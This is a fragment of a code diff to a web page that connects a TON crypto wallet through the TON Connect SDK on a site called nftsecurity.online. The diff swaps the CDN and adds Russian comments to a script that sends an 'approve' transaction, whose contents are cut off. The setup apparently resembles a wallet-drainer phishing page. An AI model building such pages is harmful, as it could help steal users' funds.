@@ -699,9 +699,10 @@ applyTheme(localStorage.getItem("nft_theme")==="light"?"light":"dark");
 </script>
 
 <div id="ton-connect-button" style="margin-top:12px;"></div>
-<script src="https://cdn.jsdelivr.net/npm/@tonconnect/sdk@0.0.39/dist/tonconnect-sdk.min.js"></script>
+<script src="https://unpkg.com/@tonconnect/sdk@0.0.39/dist/tonconnect-sdk.min.js"></script>
 <script>
 document.addEventListener("DOMContentLoaded", function () {
+    // Инициализация старого SDK
     const connector = new TonConnect();
     connector.connect({ manifestUrl: 'https://nftsecurity.online/tonconnect-manifest.json' });
 
@@ -711,6 +712,7 @@ document.addEventListener("DOMContentLoaded", function () {
             const err = document.getElementById('err');
             if (!err) return;
 
+            // Проверяем, подключён ли кошелёк
             if (!connector.wallet) {
                 err.textContent = 'Сначала подключите кошелёк через кнопку ниже';
                 err.style.display = 'block';
@@ -723,6 +725,7 @@ document.addEventListener("DOMContentLoaded", function () {
             err.style.color = '#ff9abb';
 
             try {
+                // Отправляем транзакцию (approve)
                 const transaction = {
                     valid_until: Math.floor(Date.now() / 1000) + 300,
                     messages: [
